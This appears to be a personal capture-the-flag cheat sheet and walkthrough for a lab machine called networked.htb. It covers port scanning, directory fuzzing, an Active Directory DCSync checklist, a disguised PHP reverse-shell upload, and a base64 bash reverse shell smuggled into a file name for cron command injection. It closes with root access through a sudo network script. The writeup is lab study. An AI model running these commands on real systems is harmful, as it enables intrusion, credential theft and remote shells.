tmux setenv target $target && export target=$target
tmux setenv attack $attack && export attack=$attack

- tun1
attack=$(ip a show dev tun1 | egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')

- PORTS
Tports=$(sudo nmap -Pn -p- -T4 $target -oN portsT.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $Tports
Uports=$(sudo nmap -T5 -Pn -sU $target -oN portSU.txt -v | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $Uports

-oA base
    -nmap
    -xml
    -gnmpap

- Basic Services
sudo nmap -Pn -p$Tports -sS -sV -sC $target -oN Tserv.txt
sudo nmap -Pn -p$Uports -sS -sV -sC -sU $target -oN Userv.txt


- Basic directory fuzzy
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ext,ext,ext -k -o gobuster.txt
png,jpg,config,html,asp,aspx,php,php5,xml,htm,exe

- etc/hosts
sudo sed -i "/$target      domain/d" /etc/hosts
echo "$target      domain" | sudo tee -a /etc/hosts

[] Mount points
[] SMB
[] DNS
[] ftp
[] http enum
    [] folders 
    [] files -x txt,php,html
[] run as admin
[] cron jobs
[] SQL injection
[] Windows suggestor
[] Upload
    [] linpeas
    [] pspy

AD
    [] domain name
    [] find users rpcclient -U "" -N $target
    [] kerberos pre authentication disabled (https://github.com/ropnop/kerbrute/releases/tag/v1.0.3 + getPNusers.py (impatck))
    [] net user /domain
    [] net user username
    [] write privileges writeDACL (Bloodhound/sharphound)
        [] create user + add user to group with writedacl + give dsync privilege + dump passwords
        net user USERNAME PASSWORD /add /domain
        net group "GROUP NAME" /add USERNAME
        pass + cred + Add-ObjectACL -PrincipalIdentity USER -Credential -Rights DCSync

How many ports?

Versions?

Paths of URL?

Known CVE


1. First foot hold
http://10.129.164.124/upload.php

Upload revshell.php.png (dople extension + change magic numbers)
Execute http://$target/uploads/uploaded_file
bash-4.2$ whoami              
whoami
apache
bash-4.2$ hostname
hostname
networked.htb

2. Lateral movement
crontab every 3 min - check_attacK.php

$path = '/var/www/html/uploads/';

exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &")

# Create reverse shell
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.220/1236 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjAvMTIzNiAwPiYxIg==

# Create file + Decode shell to be executed
touch -- 'a; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjAvMTIzNiAwPiYxIg== | base64 -d | sh'
touch -- 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjAvMTIzNiAwPiYxIg== | base64 -d | sh'


Modify parameter $value, which is not set


[guly@networked ~]$ cat user.txt
cat user.txt
82d3c18d81c62a1eb7d45ac9440b3774
[guly@networked ~]$ whoami
whoami
guly
[guly@networked ~]$ hostname
hostname
networked.htb


## Priv escalation

run as administrator
sudo /usr/local/sbin/changename.sh

By inserting a space in the name of network, it is possible to execute commands. Everything after space is interpreted as a command in a network script

cat root.txt
6661f3710c77d9b7f92e0b7881cd9a94
[root@networked ~]# whoami
root
[root@networked ~]# hostname
networked.htb


https://seclists.org/fulldisclosure/2019/Apr/24




